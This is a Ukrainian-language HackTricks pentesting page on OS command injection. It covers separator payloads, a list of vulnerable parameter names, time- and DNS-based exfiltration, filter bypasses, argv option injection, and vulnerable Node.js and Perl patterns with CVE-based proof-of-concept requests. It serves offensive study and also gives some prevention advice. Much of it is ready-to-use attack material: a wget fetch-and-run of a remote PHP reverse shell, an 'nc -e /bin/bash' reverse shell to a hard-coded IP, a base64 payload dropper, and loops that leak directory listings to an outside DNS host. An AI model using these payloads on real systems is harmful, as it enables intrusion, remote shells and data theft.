# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Що таке command Injection?

Використовуючи **command injection**, зловмисник може виконувати довільні команди операційної системи на сервері, що хостить додаток. Внаслідок цього додаток та всі його дані можуть бути повністю скомпрометовані. Виконання таких команд зазвичай дозволяє зловмиснику отримати неавторизований доступ або контроль над оточенням додатка та базовою системою.

### Контекст

Залежно від того, **куди вставляється ваш ввід**, може знадобитися **закрити контекст у лапках** (використовуючи `"` або `'`) перед командами.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Обходи обмежень**

Якщо ви намагаєтеся виконати **довільні команди всередині linux-машини**, вам буде цікаво прочитати про ці **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Приклади**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Параметри

Нижче наведено топ-25 параметрів, які можуть бути вразливими до code injection та подібних RCE вразливостей (з [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Витягування data: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

На основі інструмента з `https://github.com/HoLyVieR/dnsbin`, також розміщеного на dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Онлайн-інструменти для перевірки DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Під час аудиту серверної частини на JavaScript/TypeScript ви часто натрапите на Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` запускає **shell** (`/bin/sh -c`), тому будь-який символ, що має спеціальне значення для shell (back-ticks, `;`, `&&`, `|`, `$()`, …) призведе до **command injection**, коли введення користувача конкатенується в рядок.

**Запобігання:** використовуйте `execFile()` (або `spawn()` без опції `shell`) і передавайте **кожний аргумент як окремий елемент масиву**, щоб shell не брав участі:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Не всі ін’єкції вимагають shell-метасимволів. Якщо додаток передає ненадійні рядки як аргументи системній утиліті (навіть через `execve`/`execFile` і без shell), багато програм все одно розбирають будь-який аргумент, що починається з `-` або `--`, як опцію. Це дозволяє зловмиснику переключати режими, змінювати шляхи виводу або викликати небезпечну поведінку без необхідності отримувати доступ до shell.

Типові місця, де це трапляється:

- Вбудовані веб-UI/CGI обробники, які формують команди на кшталт `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, тощо.
- Централізовані CGI маршрутизатори (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) де кілька обробників повторно використовують один і той самий слабкий валідатор.

Що спробувати:

- Надайте значення, що починаються з `-`/`--`, щоб цільовий інструмент сприйняв їх як прапорці.
- Зловживайте прапорцями, що змінюють поведінку або записують файли, наприклад:
  - `ping`: `-f`/`-c 100000` щоб навантажити пристрій (DoS)
  - `curl`: `-o /tmp/x` щоб записати довільні шляхи, `-K <url>` щоб завантажити конфіг, контрольований атакуючим
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` щоб досягти post-rotate виконання в небезпечних обгортках
- Якщо програма підтримує `--` як кінець опцій, спробуйте обійти наївні пом’якшення, які додають `--` у невірне місце.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks у Apache mod_perl handlers (досяжність та експлуатація)

Реальна схема: Perl-код формує рядок команди shell і виконує його через backticks (або qx//). У mod_perl AccessHandler attacker-controlled компоненти запиту, такі як $r->uri(), можуть потрапити в цей рядок. Якщо будь-яка гілка конкатенує raw input і потім виконує його через shell, ви отримуєте pre-auth RCE.

Ризиковані Perl execution primitives (spawn a shell when given a single string):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Мінімальна вразлива форма, помічена в реальному світі:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Ключові міркування щодо досяжності в mod_perl:
- Handler registration: httpd.conf має спрямовувати запити в ваш Perl-модуль, наприклад PerlModule MOD_SEC_EMC::AccessHandler, та містити конфігурацію, яка викликає AccessHandler::handler для області шляху.
- Triggering the vulnerable branch: змусьте потік входу без автентифікації так, щоб type == "login" (наприклад, не передавайте очікуваний auth cookie).
- Resolvable path: переконайтеся, що ваш запит спрямований на URI, який резольвиться в межах налаштованої області. Якщо Apache ніколи не маршрутизує запит через handler, sink не досягається.

Exploitation workflow
1) Inspect httpd.conf for PerlModule/MOD_PERL handler scopes to find a resolvable path processed by the handler.
2) Send an unauthenticated request so the login redirect path is taken (type == "login").
3) Place shell metacharacters in the request-URI path so $r->uri() carries your payload into the command string.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Поради
- Спробуйте роздільники: ;, &&, |, `backticks`, $(...), and encoded newlines (%0A) залежно від способу цитування.
- Якщо в ранніх патчах інші args цитуються, але не URI в одній гілці, payloads, додані в кінець рядка, часто працюють: ;id# or &&/usr/bin/id#

Зміцнення (Perl)
- Не будуйте shell-рядки. Віддавайте перевагу виконанню з вектором аргументів: system('/usr/bin/curl', '--silent', '--', $safe_url) — no shell.
- Якщо shell неминучий, екраніруйте суворо й узгоджено у всіх гілках; ставтесь до $r->uri() як до ворожого. Consider URI::Escape for paths/queries and strong allowlists.
- Уникайте backticks/qx// для виконання команд; capture output via open3/list form if truly needed without invoking a shell.
- У mod_perl handlers тримайте auth/redirect code paths вільними від виконання команд або забезпечте ідентичну санітизацію у всіх гілках, щоб уникнути регресій «fixed everywhere but one branch».

Пошук вразливостей
- Аналізуйте diff патчів модулів, що збирають shell-команди; шукайте невідповідне цитування між гілками (наприклад, if ($type eq 'login') left unescaped).
- Grep для backticks, qx//, open\s*\(|\||, and system\s*\(\s*" щоб знайти string-based shells. Побудуйте call graph від sink до точки входу запиту ($r), щоб перевірити досяжність pre-auth.

Реальний випадок: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw $uri ($r->uri()).
- Досяжно через MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Практичний нюанс: використовуйте резольвований шлях, який покриває handler; інакше модуль не виконається і sink не буде досягнуто.

## Посилання

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
